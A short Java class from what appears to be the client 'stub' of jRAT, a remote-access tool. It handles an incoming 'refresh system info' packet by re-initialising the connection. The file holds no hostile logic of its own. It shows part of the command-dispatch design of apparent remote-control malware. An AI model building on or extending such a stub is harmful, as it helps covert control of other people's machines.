package pro.jrat.stub.packets.incoming;

import pro.jrat.stub.Connection;

public class Packet27RefreshSystemInfo extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Connection.initialize();
	}

}
